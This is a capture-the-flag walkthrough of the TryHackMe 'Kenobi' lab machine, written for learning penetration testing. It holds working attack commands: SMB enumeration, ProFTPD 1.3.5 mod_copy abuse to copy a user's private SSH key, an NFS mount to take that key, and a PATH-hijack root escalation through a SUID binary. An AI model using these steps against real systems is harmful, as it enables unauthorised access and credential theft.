# TryHackMe - Kenobi Writeup

A walkthrough of the **Kenobi** room on TryHackMe, focusing on Samba shares, ProFTPD exploitation, and privilege escalation via SUID binaries.

## Reconnaissance

### Port Scan

```bash
nmap -sC -sV -oN kenobi.nmap 10.10.x.x
```

Key findings:
- **Port 21** — ProFTPD 1.3.5
- **Port 22** — OpenSSH 7.2p2
- **Port 80** — Apache httpd 2.4.18
- **Port 111** — rpcbind
- **Port 139/445** — Samba

### SMB Enumeration

```bash
smbclient -L //10.10.x.x
smbget -R smb://10.10.x.x/anonymous
```

Found a `log.txt` file containing SSH key information and ProFTPD config.

## Exploitation

ProFTPD 1.3.5 is vulnerable to **mod_copy** which allows unauthenticated file copy:

```bash
nc 10.10.x.x 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

Then mount the NFS share and grab the key:

```bash
sudo mount 10.10.x.x:/var /mnt/kenobiNFS
cp /mnt/kenobiNFS/tmp/id_rsa .
chmod 600 id_rsa
ssh -i id_rsa kenobi@10.10.x.x
```

## Privilege Escalation

Found a SUID binary:

```bash
find / -perm -u=s -type f 2>/dev/null
# /usr/bin/menu
```

The binary runs `curl` without a full path — classic PATH manipulation:

```bash
echo '/bin/bash' > /tmp/curl
chmod +x /tmp/curl
export PATH=/tmp:$PATH
/usr/bin/menu
# Select option 1
# root!
```

## Key Takeaways

- Always enumerate SMB shares thoroughly
- ProFTPD mod_copy is a powerful attack vector
- SUID binaries with relative paths = easy privesc
